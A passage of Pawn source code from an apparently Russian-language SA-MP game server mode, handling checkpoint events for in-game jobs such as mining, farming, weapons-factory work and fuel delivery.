		ShowPlayerDialog(playerid, D_HEAL+17, 2, "Мэрия > Список работ", "{ffffff}Водитель автобуса\t\t\t{33AAFF}|\t2 уровень\n{ffffff}Водитель такси\t\t\t{33AAFF}|\t2 уровень\n{ffffff}Развозчик продуктов\t\t\t{33AAFF}|\t3 уровень\n{ffffff}Развозчик топлива\t\t\t{33aaff}|\t3 уровень\n{ffffff}Автомеханик\t\t\t\t{33aaff}|\t3 уровень\n{ffffff}Дальнобойщик\t\t\t{33aaff}|\t6 уровень", "Выбор", "Отмена");
	}
	// Если игрок подобрал ящик
	if(checkpointid == hereCheckLoader[playerid])
	{
    drawer[playerid] = CreateDynamicObject(1224, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    AttachDynamicObjectToVehicle(drawer[playerid], GetPlayerVehicleID(playerid), 0.0, 0.6, 0.6, 0.0, 0.0, 0.0);
    new rand = random(sizeof(checkLoaderUnload));
    hereCheckUnLoader[playerid] = CreateDynamicCP(checkLoaderUnload[rand][0], checkLoaderUnload[rand][1], checkLoaderUnload[rand][2], 1.6, -1, -1, playerid, 100.0);
    DestroyDynamicCP(hereCheckLoader[playerid]);
	}
	// Если игрок сгрузил ящик
	else if(checkpointid == hereCheckUnLoader[playerid])
	{
    GiveMoney(playerid, 30); // При желании вы можете записывать деньги в переменную а выдавать при зарплате
    GameTextForPlayer(playerid, "~g~+30$", 3000, 4);
    new rand = random(sizeof(checkLoader));
    hereCheckLoader[playerid] = CreateDynamicCP(checkLoader[rand][0], checkLoader[rand][1], checkLoader[rand][2], 1.6, -1, -1, playerid, 100.0);
    DestroyDynamicCP(hereCheckUnLoader[playerid]);
    DestroyDynamicObject(drawer[playerid]);
	}
	if(checkpointid == Pickup[10])
	{
		if(GetPVarInt(playerid,"FarmDuty") == 1) return SendClientMessage(playerid, COLOR_GREY, "Вы не закончили работу фермера!");
		if(GetPVarInt(playerid, "LicTest") > 0) return ShowPlayerDialog(playerid, D_NULL, 0, "{33AAFF}Права", "{ffffff}Вы уже сдаете экзамен по вождению", "Закрыть", "");
		if(PlayerInfo[playerid][pLic][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "У вас уже есть лизенцзия на вождение!");
		ShowPlayerDialog(playerid, D_JOB+42, 0, "{33AAFF}Права", "{ffffff}Вы хотите сдать экзамен по вождению?\n\nСтоимость: {00FF00}1000 {ffffff}долларов\nДля новичков: {00FF00}300 {ffffff}долларов", "Да", "Нет");
	}
	return true;
}
public OnPlayerLeaveDynamicCP(playerid, checkpointid) return true;
forward OnPlayerPickupExit(playerid);
public OnPlayerPickupExit(playerid)
{
	if(oldpickup[playerid] == -1) return true; // Если старый пикап -1 то завершаем паблик
	new Float:z; // Создаем переменную для определения z координаты
	GetPlayerPos(playerid, z, z, z); // Узнаем позицию Z
	if(!IsPlayerInRangeOfPoint(playerid,2.8,PickupX[playerid],PickupY[playerid],z)) oldpickup[playerid] = -1; // Если игрок не около пикапа присваиваем переменной значение -1
	return true;
}
forward AttachKustToPlayer(playerid);
public AttachKustToPlayer(playerid)
{
	if(GetPVarInt(playerid,"FarmSbor") == 2)
	{
		KillTimer(KustTimer[playerid]);
		SetPlayerAttachedObject(playerid, 3, 2247, 6, -0.003353, 0.093383, 0.176903, 0.000000, 0.000000, 0.000000, 0.788097, 1.000000, 0.991011); //RemovePlayerAttachedObject(playerid,2);
		SetPVarInt(playerid,"FarmSbor", 3);
		ClearAnimText(playerid);
		DisablePlayerCheckpoint(playerid);
	}
	TogglePlayerControllable(playerid,true);
}
public OnPlayerEnterCheckpoint(playerid)
{
	new string[128];
	printf("Игрок %s только что встал на чекпоинт", PlayerInfo[playerid][pSendername]);
	if(PlayerToPoint(120.5, playerid,-260.0859,-1348.3464,7.6081) && GetPVarInt(playerid,"FarmSbor") == 1)
	{
		ApplyAnimation(playerid,"BOMBER","BOM_Plant_Loop",4.1,1,0,0,1,0,0);
		SetPVarInt(playerid,"FarmSbor", 2);
		KustTimer[playerid] = SetTimerEx("AttachKustToPlayer",16000,false,"i",playerid);
	}
	if(PlayerToPoint(2.5, playerid,2833.0859,-2496.3464,14.6081) && GetPVarInt(playerid,"pGruz") == 1)
	{
		Meshok[playerid] = 1;
		ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
		SetPlayerAttachedObject(playerid, 2, 3052, 5, 0.01, 0.1, 0.2, 100, 10, 85);
		SetPVarInt(playerid,"pGruz", 2);
		SetPlayerCheckpoint(playerid,2800.4092,-2403.3076,13.6306,1.5);
		ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
		AnimUpdate(playerid);
		AnimTimer[playerid] = SetTimerEx("AnimUpdate",5000,true,"i",playerid);
	}
	if(PlayerToPoint(2.5, playerid,2800.4092,-2403.3076,13.6306) && GetPVarInt(playerid,"pGruz") == 2)
	{
		Meshok[playerid] = 0;
		ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
		Meshki[playerid]++;
		if(IsPlayerAttachedObjectSlotUsed(playerid,2)) RemovePlayerAttachedObject(playerid,2);
		format(string, 128, "Ящиков перетащено {A52A2A}%d",Meshki[playerid]);
		SendClientMessage(playerid, COLOR_ORANGE, string);
		SetPVarInt(playerid,"pGruz", 1);
		SetPlayerCheckpoint(playerid,2833.0859,-2496.3464,14.6081,1.5);
		KillTimer(AnimTimer[playerid]);
	}
	if(Mission[playerid] == 1 && IsPlayerInAnyVehicle(playerid))
	{
		DisablePlayerCheckpoint(playerid);
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
		ShowPlayerDialog(playerid, 1113, 1, "Завод", "Введите кол-во кг материалов (От 1 до 5000)", "Принять", "Отмена");
		Mission[playerid] = 2;
		return true;
	}
	if(Missions[playerid] == 1)
	{
		DisablePlayerCheckpoint(playerid);
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
		ShowPlayerDialog(playerid, 11131, 1, "Шахта", "Введите кол-во кг материалов (От 1 до 500)", "Принять", "Отмена");
		Missions[playerid] = 2;
		return true;
	}
	if(CP[playerid] == 3)
	{
	new s[256];
	new s2[256];
	new s3[256];
	new s4[256];
	new s5[256];
	new s6[256];
	if(Ruda[playerid] == 1)
	{
		ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
		RemovePlayerAttachedObject(playerid, 2);
		RemovePlayerAttachedObject(playerid, 3);
		RudaNiz[playerid] = 20+random(30);
		format(s, sizeof(s),"Вы принесли %d кг. низкого качества руды",RudaNiz[playerid]);
		SendClientMessage(playerid,COLOR_WHITE,s);
		rnizzp[playerid] = rnizzp[playerid]+RudaNiz[playerid];
		format(s2, sizeof(s2),"Принесено: всего %d кг руды низкого качества",rnizzp[playerid]);
		SendClientMessage(playerid,COLOR_WHITE,s2);
		SetPlayerAttachedObject(playerid, 3, 18634, 6, 0.078222, 0.000000, 0.110844, 298.897308, 264.126861, 193.350555, 1.000000, 1.000000, 1.000000);
		DisablePlayerCheckpoint(playerid);
		CP[playerid] = 0;
		Samorodok[playerid] = 0;
		Metall += RudaNiz[playerid];
    	SetTimer("UpdateShaht",100,false);
		SaveShahta();
	}
	if(Ruda[playerid] == 2)
	{
		ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
		RemovePlayerAttachedObject(playerid, 2);
		RemovePlayerAttachedObject(playerid, 3);
		RudaSr[playerid] = 20+random(30);
		format(s3, sizeof(s3),"Вы принесли %d кг. среднего качества руды",RudaSr[playerid]);
		SendClientMessage(playerid,COLOR_WHITE,s3);
		rsrzp[playerid] = rsrzp[playerid]+RudaSr[playerid];
		format(s4, sizeof(s4),"Принесено: всего %d кг руды среднего качества",rsrzp[playerid]);
		SendClientMessage(playerid,COLOR_WHITE,s4);
		DisablePlayerCheckpoint(playerid);
		CP[playerid] = 0;
		SetPlayerAttachedObject(playerid, 3, 18634, 6, 0.078222, 0.000000, 0.110844, 298.897308, 264.126861, 193.350555, 1.000000, 1.000000, 1.000000);
		Samorodok[playerid] = 0;
		Metall += RudaSr[playerid];
    	SetTimer("UpdateShaht",100,false);
		SaveShahta();
	}
	if(Ruda[playerid] == 3)
	{
		ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
		RemovePlayerAttachedObject(playerid, 2);
		RemovePlayerAttachedObject(playerid, 3);
		RudaViz[playerid] = 20+random(30);
		format(s5, sizeof(s5),"Вы принесли %d кг. высокого качества руды",RudaViz[playerid]);
		SendClientMessage(playerid,COLOR_WHITE,s5);
		rvizzp[playerid] = rvizzp[playerid]+RudaViz[playerid];
		format(s6, sizeof(s6),"Принесено: всего %d кг руды высокого качества",rvizzp[playerid]);
		SendClientMessage(playerid,COLOR_WHITE,s6);
		SetPlayerAttachedObject(playerid, 3, 18634, 6, 0.078222, 0.000000, 0.110844, 298.897308, 264.126861, 193.350555, 1.000000, 1.000000, 1.000000);
		DisablePlayerCheckpoint(playerid);
		CP[playerid] = 0;
		Samorodok[playerid] = 0;
		Metall += RudaViz[playerid];
    	SetTimer("UpdateShaht",100,false);
		SaveShahta();
	}
	return 1;
	}
	if(CP[playerid] == 4)
	{
		if(Zavodz >= 1)
		{
			pMet[playerid] = 1;
			Zavodz--;
			SaveShahta();
			SetTimer("UpdateShaht",100,false);
			SendClientMessage(playerid,0x00FFFFFF,"Вы взяли 1 кг металла. Подойдите к свободному столу для сбора оружия.");
			GameTextForPlayer(playerid,"~b~+1kg",3000,1);
			DisablePlayerCheckpoint(playerid);
		}
		else
		{
			SendClientMessage(playerid,0xB4B5B7FF,"Склад пуст");
		}
    	return 1;
	}
	if(CP[playerid] == 5 && pBoxobdel[playerid] == 2 && pPatr[playerid] == 1)
	{
    RemovePlayerAttachedObject(playerid, 4);
	Zavodzp[playerid]++;
	SendClientMessage(playerid,0x00FFFFFF,"Вы принесли готовый ящик с патронами. Отправляйтесь делать другой.");
	DisablePlayerCheckpoint(playerid);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
	pBoxobdel[playerid] = 0;
    pObdelbox[playerid] = 0;
    pPatr[playerid] = 0;
    CP[playerid] = 4;
    Gotovbox[playerid] = 0;
    Patronbox++;
    SetTimer("UpdateShaht",100,false);
    SetPlayerCheckpoint(playerid,2564.7886,-1292.9933,1044.1250,3.0);
	return 1;
	}
    if(CP[playerid] == 6 && ZPerevoz[playerid] == 1)
	{
		SendClientMessage(playerid,0x00FF00FF,"Отлично! Спасибо за выполненую работу, держи обещаные деньги...");
        new vehid;
		vehid = GetPlayerVehicleID(playerid);
		Zavodz += Jelez[vehid];
		Jelez[vehid] = 0;
		Missions[playerid] = 0;
		Delete3DTextLabel(VehJZ[vehid]);
		GiveMoney(playerid, 300);
		DisablePlayerCheckpoint(playerid);
		CP[playerid] = 0;
		SetTimer("UpdateShaht",100,false);
		SaveShahta();
		return 1;
	}
	if(GetPVarInt(playerid,"Miner") == 2)
	{
		RemovePlayerAttachedObject(playerid,4);
		DisablePlayerCheckpoint(playerid);
		TogglePlayerControllable(playerid,1);
		ClearAnimations(playerid);
		ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
		SetPVarInt(playerid,"Miner", 1);
		SetPVarInt(playerid, "MinerKG", GetPVarInt(playerid, "MinerKG") + GetPVarInt(playerid, "MinerKG_One"));
		SendMes(playerid, COLOR_WHITE, "Вы принесли {33AAFF}%i{ffffff} кг руды. Всего принесено: {33AAFF}%i{ffffff} кг", GetPVarInt(playerid, "MinerKG_One"), GetPVarInt(playerid, "MinerKG"));
		Mineral[0] += GetPVarInt(playerid, "MinerKG_One");
		SetOtherInt("mineral", Mineral[0]);
		DeletePVar(playerid, "MinerKG_One");
		format(string, 50, "Руды на складе: {FF9900}%i{ffffff} кг", Mineral[0]);
  		Update3DTextLabelText(tPickup[7], 0xFFFFFFFF, string);
    	Update3DTextLabelText(tPickup[8], 0xFFFFFFFF, string);
    	Update3DTextLabelText(tPickup[9], 0xFFFFFFFF, string);
    	Update3DTextLabelText(tPickup[10], 0xFFFFFFFF, string);
		SetPlayerAttachedObject( playerid, 3, 18634, 6, 0.078222, 0.000000, 0.110844, 298.897308, 264.126861, 193.350555, 1.000000, 1.000000, 1.000000 );
		return 1;
	}
	if(GetPVarInt(playerid, "FactoryPlace") > 0 && IsPlayerInRangeOfPoint(playerid, 3.0, 141.8937,1865.5713,1001.0322))
	{
		if(Metal < 200)
		{
		    SendClientMessage(playerid, COLOR_GREY, "Недостаточно металла на складе!");
		    return 1;
		}
		Metal -= 200;
		SetOtherInt("Metal", Metal);
		//SetPlayerAttachedObject( playerid, 3, 355, 14, 0.301943, 0.011442, 0.010348, 106.050292, 330.509094, 3.293162, 1.000000, 1.000000, 1.000000 );
        SetPlayerAttachedObject( playerid, 3, 2969, 1, 0.175578, 0.347083, 0.000000, 1.248928, 97.393852, 359.645050, 1.000000, 1.000000, 1.000000 );
	 	ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
    	new i = GetPVarInt(playerid, "FactoryPlace")-1;
    	SetPlayerCheckpoint(playerid, InFactory[i][0],InFactory[i][1],InFactory[i][2], 1.4);
    	SendClientMessage(playerid, COLOR_LIGHTGREEN, "Следуйте к вашему рабочему столу. {ffffff}Используйте: \"левую кнопку мыши (огонь)\"");
	}
	if(GetPVarInt(playerid, "FactoryPlaceSF") > 0 && IsPlayerInRangeOfPoint(playerid, 12.0, -2163.4541,-271.6947,35.320))
	{
		new slot = GetPVarInt(playerid, "FactorySlot");
		if(MafiaMetal[slot] < 200)
		{
		    SendClientMessage(playerid, COLOR_GREY, "Недостаточно металла на складе!");
		    return 1;
		}
		//SetPlayerAttachedObject( playerid, 3, 355, 14, 0.301943, 0.011442, 0.010348, 106.050292, 330.509094, 3.293162, 1.000000, 1.000000, 1.000000 );
        SetPlayerAttachedObject( playerid, 3, 2969, 1, 0.175578, 0.347083, 0.000000, 1.248928, 97.393852, 359.645050, 1.000000, 1.000000, 1.000000 );
	 	ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
    	new i = GetPVarInt(playerid, "FactoryPlaceSF")-1;
    	SetPlayerCheckpoint(playerid, InFactorySF[i][0],InFactorySF[i][1],InFactorySF[i][2], 1.4);
    	SendClientMessage(playerid, COLOR_YELLOW, "Следуйте к вашему рабочему столу. {ffffff}Используйте: \"левую кнопку мыши (огонь)\"");
	}
	if(GetPVarInt(playerid, "FactoryPlaceSF") > 0 && IsPlayerInRangeOfPoint(playerid, 3.0, InFactorySF[GetPVarInt(playerid, "FactoryPlaceSF")-1][0],InFactorySF[GetPVarInt(playerid, "FactoryPlaceSF")-1][1],InFactorySF[GetPVarInt(playerid, "FactoryPlaceSF")-1][2]))
	{
		SetTimerEx("WeaponAnim", 500, false, "i", playerid);
		SetPVarInt(playerid,"MinerCount",1);
	}
	if(GetPVarInt(playerid, "FactoryPlace") > 0 && IsPlayerInRangeOfPoint(playerid, 3.0, InFactory[GetPVarInt(playerid, "FactoryPlace")-1][0],InFactory[GetPVarInt(playerid, "FactoryPlace")-1][1],InFactory[GetPVarInt(playerid, "FactoryPlace")-1][2]))
	{
		SetTimerEx("WeaponAnim", 500, false, "i", playerid);
		SetPVarInt(playerid,"MinerCount",1);
	}
	if(IsPlayerInRangeOfPoint(playerid, 10.0, 339.3525,1927.6963,17.2043) && Mission[playerid] == 2)
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
		new vehid;
		vehid = GetPlayerVehicleID(playerid);
		Mats[0] += Jelez[vehid];
		Jelez[vehid] = 0;
		SendClientMessage(playerid,0x00FF00FF,"Прапорщик наградил тебя 100 $...");
		Mission[playerid] = 0;
		GiveMoney(playerid, 100);
		Delete3DTextLabel(VehJZ[vehid]);
		DisablePlayerCheckpoint(playerid);
		return true;
	}
	return true;
}
forward WeaponAnim(playerid);
public WeaponAnim(playerid)
{
	if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid,3);
	ClearAnimations(playerid);
	ApplyAnimation( playerid, "BUDDY", "buddy_reload", 4.1, 0, 1, 1, 1, 0 );
	SetPlayerAttachedObject( playerid, 3, 355, 14, 0.301943, 0.011442, 0.010348, 106.050292, 330.509094, 3.293162, 1.000000, 1.000000, 1.000000 );
	return true;
}
public OnPlayerLeaveCheckpoint(playerid) return true;
public OnPlayerEnterRaceCheckpoint(playerid)
{
	printf("Игрок %s только что встал на гоночный чекпоинт", PlayerInfo[playerid][pSendername]);
	new string[128];
	if(GetPVarInt(playerid,"FarmCombainer") != 0)
	{
		if(!IsAFarmer(playerid))
		{
			DeletePVar(playerid,"FarmCombainer");
			DisablePlayerRaceCheckpoint(playerid);
			SendClientMessage(playerid,-1,"Ошибка 1422!");
		}
		switch(GetPVarInt(playerid,"FarmCombainer"))
		{
		case 1:
			{
				SetPVarInt(playerid,"FarmCombainer",2);
				SetPlayerRaceCheckpoint(playerid,1, -317.7377,-1362.6233,9.3812,0.0,0.0,0.0,8);
			}
		case 2:
			{
				SetPVarInt(playerid,"FarmCombainer",3);
				SetPlayerRaceCheckpoint(playerid,1, -308.9011,-1324.8210,8.3992,0.0,0.0,0.0,8);
			}
		case 3:
			{
				SetPVarInt(playerid,"FarmCombainer",4);
				SetPlayerRaceCheckpoint(playerid,1, -288.7189,-1323.1710,8.1687,0.0,0.0,0.0,8);
			}
		case 4:
			{
				SetPVarInt(playerid,"FarmCombainer",5);
				SetPlayerRaceCheckpoint(playerid,1, -279.1142,-1364.3391,9.2215,0.0,0.0,0.0,8);
			}
		case 5:
			{
				SetPVarInt(playerid,"FarmCombainer",6);
				SetPlayerRaceCheckpoint(playerid,1, -273.1164,-1413.0277,10.7683,0.0,0.0,0.0,8);
			}
		case 6:
			{
				SetPVarInt(playerid,"FarmCombainer",7);
				SetPlayerRaceCheckpoint(playerid,1, -217.2152,-1412.2667,5.3100,0.0,0.0,0.0,8);
			}
		case 7:
			{
				SetPVarInt(playerid,"FarmCombainer",8);
				SetPlayerRaceCheckpoint(playerid,1, -211.8008,-1368.0311,5.8664,0.0,0.0,0.0,8);
			}
		case 8:
			{
				SetPVarInt(playerid,"FarmCombainer",9);
				SetPlayerRaceCheckpoint(playerid,1, -181.6612,-1325.6177,6.1993,0.0,0.0,0.0,8);
			}
		case 9:
			{
				SetPVarInt(playerid,"FarmCombainer",10);
				SetPlayerRaceCheckpoint(playerid,1, -187.8659,-1394.9382,4.4381,0.0,0.0,0.0,8);
			}
		case 10:
			{
				DeletePVar(playerid,"FarmCombainer");
				DisablePlayerRaceCheckpoint(playerid);
				SendClientMessage(playerid,-1,"Вы закончили рассаду зерен!");
				FarmWork = 0;
			}
		}
	}
	if(GetPVarInt(playerid,"pGPSWork") == 1)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "[GPS] Вы прибыли к месту назначения!");
		DisablePlayerRaceCheckpoint(playerid);
		DeletePVar(playerid,"pGPSWork");
		return 1;
	}
	if(GetPVarInt(playerid,"FarmDuty") == 1 && IsAFarmer(playerid))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится за рулем транспорта!");
		{
			TogglePlayerControllable(playerid,false);
			SendClientMessage(playerid, COLOR_YELLOW, "Чтобы закончить сборы зайдите в авто, перед этим наберите 1000 кустов");
			DisablePlayerRaceCheckpoint(playerid);
			new Float:p[3]; GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
			GetXYInBackOfPlayer(playerid,p[0],p[1],4.0);
			SetVehicleVelocity(GetPlayerVehicleID(playerid), 0.0, 0.0, 0.0);
			Seeds[GetPlayerVehicleID(playerid)] = 0;
			vehiclerun[GetPlayerVehicleID(playerid)] = 1;
			farmpickup = CreatePickup(19198,23,p[0],p[1],p[2]+0.7,-1); // 1 = id фермы
			veh3dtext = Create3DTextLabel("Кустов: 0 / 1000",COLOR_WHITE,p[0],p[1],p[2]+1.0,20.0,0,0);
			SetTimerEx("PlayerToggle", 1000, false, "d", playerid);
			//RemovePlayerFromVehicle(playerid);
		}
		return true;
	}
	if(GetPVarInt(playerid, "FindPlayer") == 1)
	{
		SendClientMessage(playerid, COLOR_BLUE, "Вы достигли места назначения!");
		DeletePVar(playerid, "FindPlayer");
		DisablePlayerRaceCheckpoint(playerid);
		return true;
	}
	if(GetPVarInt(playerid, "FuelCarLittle") == 1)
	{
		new i = GetPVarInt(playerid, "LittleFull") - 1;
		MafiaInfo[3][mFuel][i] -= 100;
		format(MafiaInfo[3][mFuels], 128, "%i, %i, %i, %i, %i", MafiaInfo[3][mFuel][0],
		MafiaInfo[3][mFuel][1], MafiaInfo[3][mFuel][2], MafiaInfo[3][mFuel][3], MafiaInfo[3][mFuel][4]);
		SetMafiaStr(3, "fuel", MafiaInfo[3][mFuels]);
		format(string, 50, "Топлива в скважине: {FF9900}%i{ffffff} литров", MafiaInfo[3][mFuel][i]);
		Update3DTextLabelText(tPickup[20+i], 0xffffffff, string);
		DeletePVar(playerid, "LittleFull");
		SetPVarInt(playerid, "FuelCarLittle", 2);
		new rand = random(5);
		if(rand == 0 || rand == 1) SetPlayerRaceCheckpoint(playerid,1,248.3731,1371.2498,10.5859, 0.0, 0.0, 0.0,5.0);
		if(rand == 2) SetPlayerRaceCheckpoint(playerid,1,246.3248,1343.8315,10.5859, 0.0, 0.0, 0.0,5.0);
		if(rand == 3) SetPlayerRaceCheckpoint(playerid,1,246.5734,1395.7122,10.5859, 0.0, 0.0, 0.0,5.0);
		if(rand == 4 || rand == 5) SetPlayerRaceCheckpoint(playerid,1,247.4168,1420.3143,10.5859, 0.0, 0.0, 0.0,5.0);
		SendClientMessage(playerid, COLOR_YELLOW, "Следуйте на чекпоинт, чтобы разгрузить груз");
		return true;
	}
	if(GetPVarInt(playerid, "FuelCarLittle") == 2)
	{
		FuelBank+=100;
		SetOtherInt("fuelbank", FuelBank);
		SetPVarInt(playerid, "FuelCarLittle", 1);
		format(string, 50, "Топлива на заводе: {FF9900}%i{ffffff} литров", FuelBank);
		Update3DTextLabelText(tPickup[25], 0xFFFFFFFF, string);
		Update3DTextLabelText(tPickup[26], 0xFFFFFFFF, string);
		Update3DTextLabelText(tPickup[27], 0xFFFFFFFF, string);
		Update3DTextLabelText(tPickup[28], 0xFFFFFFFF, string);
		new full;
		for(new i = 0; i < 5; i++)
		{
			if(MafiaInfo[3][mFuel][i] > 100) full = i+1;
		}
		if(full == 0)
		{
			PlayerInfo[playerid][pPayCheck] += GetPVarInt(playerid, "JobLittlePrice");
			DeletePVar(playerid, "LittleFull");
			DeletePVar(playerid, "JobLittlePrice");
			DeletePVar(playerid, "FuelCarLittle");
			RemoveFromVehicle(playerid);
			return SendClientMessage(playerid, COLOR_GREY, "В скважинах нет топлива, подождите!");
		}
		SetPVarInt(playerid, "JobLittlePrice", GetPVarInt(playerid, "JobLittlePrice") + 250);
		SendMes(playerid, COLOR_YELLOW, "Вы доставили {ffffff}100 {ffff00}литров топлива. На заводе: {ffffff}%i {ffff00}литров", FuelBank);
		SetPVarInt(playerid, "LittleFull", full);
		full--;
		if(full == 0) SetPlayerRaceCheckpoint(playerid, 1, 433.7109,1580.9321,11.4922, 0.0, 0.0, 0.0, 5.0);
		if(full == 1) SetPlayerRaceCheckpoint(playerid, 1, 600.3598,1515.3052,7.8325, 0.0, 0.0, 0.0, 5.0);
		if(full == 2) SetPlayerRaceCheckpoint(playerid, 1, 578.3732,1439.7570,11.1406, 0.0, 0.0, 0.0, 5.0);
		if(full == 3) SetPlayerRaceCheckpoint(playerid, 1, 627.6626,1369.1279,11.9845, 0.0, 0.0, 0.0, 5.0);
		if(full == 4) SetPlayerRaceCheckpoint(playerid, 1, 353.2522,1317.3221,12.4766, 0.0, 0.0, 0.0, 5.0);
		return true;

	}
	if(GetPVarInt(playerid, "Noun") == 1 && GetPlayerState(playerid) == 2 && GetVehicleModel(GetPlayerVehicleID(playerid)) == 486)
	{
		AttachObjectToVehicle(NounObject[GetPVarInt(playerid, "NounObjID")], GetPlayerVehicleID(playerid), 0.0, 3.0, -0.75, 0.0, 0.0, 0.0);
		SendClientMessage(playerid, COLOR_GREEN, "Вы прицепили камень, отвезите его на дробилку");
		new randcheck = random(3);
		if(randcheck == 2) SetPlayerRaceCheckpoint(playerid, 1, 696.6295,842.6615,-27.1744, 0.0,0.0,0.0,4);
		else SetPlayerRaceCheckpoint(playerid, 1, 685.0774,821.7922,-27.1739, 0.0,0.0,0.0,4);
		SetPVarInt(playerid, "Noun", 2);
		SetPVarInt(playerid, "MinerKG_One", random(60) + 41);
		return true;
	}
	if(GetPVarInt(playerid, "Noun") == 2 && GetPlayerState(playerid) == 2 && GetVehicleModel(GetPlayerVehicleID(playerid)) == 486)
	{
		SetPVarInt(playerid, "MinerKG", GetPVarInt(playerid, "MinerKG") + GetPVarInt(playerid, "MinerKG_One"));
		SendMes(playerid, COLOR_WHITE, "Вы привезли {33AA33}%i{ffffff} кг руды. Всего привезено: {33AA33}%i{ffffff} кг", GetPVarInt(playerid, "MinerKG_One"), GetPVarInt(playerid, "MinerKG"));
		Mineral[0] += GetPVarInt(playerid, "MinerKG_One");
		SetOtherInt("mineral", Mineral[0]);
		DeletePVar(playerid, "MinerKG_One");
		format(string, 50, "Руды на складе: {FF9900}%i{ffffff} кг", Mineral[0]);
		Update3DTextLabelText(tPickup[7], 0xFFFFFFFF, string);
		Update3DTextLabelText(tPickup[8], 0xFFFFFFFF, string);
		Update3DTextLabelText(tPickup[9], 0xFFFFFFFF, string);
		Update3DTextLabelText(tPickup[10], 0xFFFFFFFF, string);
		DestroyObject(NounObject[GetPVarInt(playerid, "NounObjID")]);
		if(GetPVarInt(playerid, "NounObjID") < 10) NounObject[GetPVarInt(playerid, "NounObjID")] = CreateObject(3930,560.3654+random(10),840.2457+random(75),-44.00700073,0.00000000,0.00000000,0.00000000);
		else NounObject[GetPVarInt(playerid, "NounObjID")] = CreateObject(3930,615.3654+random(55),815.2457+random(65),-43.6009,0.00000000,0.00000000,0.00000000);
		SetPVarInt(playerid, "Noun", 1);
		new randobj = random(19);
		new Float:X, Float:Y, Float:Z;
		GetObjectPos(NounObject[randobj], X, Y, Z);
		SetPVarInt(playerid, "NounObjID", randobj);
		SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0,0.0,0.0,3);
		return true;
	}
	if(GetPVarInt(playerid, "FuelID") > 0)
	{
		if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Вы должны прицепить трейлер!");
		new i = FuelInfo[GetPVarInt(playerid, "FuelID")][pBizzid], playerd;
		Delete3DTextLabel(FuelInfo[GetPVarInt(playerid, "FuelID")][pText3D]);
		BizzInfo[i][bProduct] += FuelInfo[GetPVarInt(playerid, "FuelID")][pTill];
		PlayerInfo[playerid][pPayCheck] += 2000;
		SendMes(playerid, TEAM_BLUE_COLOR, "Вы доставили %i продуктов для %s (%s)", FuelInfo[GetPVarInt(playerid, "FuelID")][pTill], BizzInfo[i][bName], FuelInfo[GetPVarInt(playerid, "FuelID")][pName]);
		sscanf(FuelInfo[GetPVarInt(playerid, "FuelID")][pName], "u", playerd);
		SendClientMessage(playerid, COLOR_WHITE, "2000$ добавлено к вашей зарплате");
		if(MafiaInfo[3][mFraction] == F_YAKUZA)
		{
			FracBank[5] += FuelInfo[GetPVarInt(playerid, "FuelID")][pPrice] / 4;
			SetOtherInt("yakuzabank", FracBank[5]);
		}
		if(MafiaInfo[3][mFraction] == F_LCN)
		{
			FracBank[6] += FuelInfo[GetPVarInt(playerid, "FuelID")][pPrice] / 4;
			SetOtherInt("lcnbank", FracBank[6]);
		}
		if(MafiaInfo[3][mFraction] == F_RM)
		{
			FracBank[7] += FuelInfo[GetPVarInt(playerid, "FuelID")][pPrice] / 4;
			SetOtherInt("rmbank", FracBank[7]);
		}
		if(IsPlayerConnected(playerd))
		{
			SendClientMessage(playerd, 0x006699FF, "[ - - - - - - - - - - - - - - - - - - - - - ]");
			SendMes(playerd, 0x006699FF, "Развозчик топлива {ffffff}%s {006699}выполнил ваш заказ", PlayerInfo[playerid][pSendername]);
			SendMes(playerd, 0x006699FF, "Кол-во: {ffffff}%i {006699}литров", FuelInfo[GetPVarInt(playerid, "FuelID")][pTill]);
			SendMes(playerd, 0x006699FF, "Оплата: {ffffff}%i {006699}долларов", FuelInfo[GetPVarInt(playerid, "FuelID")][pPrice]);
			SendClientMessage(playerd, 0x006699FF, "[ - - - - - - - - - - - - - - - - - - - - - ]");
		}
		for(new p = 0; p <= MAX_PLAYERS; p++)
		{
			if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || GetPVarInt(p, "FuelID") == 0) continue;
			if(GetPVarInt(p, "FuelID") > GetPVarInt(playerid, "FuelID")) SetPVarInt(p, "FuelID", GetPVarInt(p, "FuelID") - 1);
		}
		for(new p = GetPVarInt(playerid, "FuelID"); p <= TOTALPRODUCT - 1; p++)
		{
			strmid(FuelInfo[p][pName],FuelInfo[p+1][pName],0,strlen(FuelInfo[p+1][pName]),MAX_PLAYER_NAME);
			FuelInfo[p][pBizzid] = FuelInfo[p+1][pBizzid];
			FuelInfo[p][pPrice] = FuelInfo[p+1][pPrice];
			FuelInfo[p][pTill] = FuelInfo[p+1][pTill];
			FuelInfo[p][pStatus] = FuelInfo[p+1][pStatus];
			FuelInfo[p][pText3D] = FuelInfo[p+1][pText3D];
		}
		TOTALFUEL--;
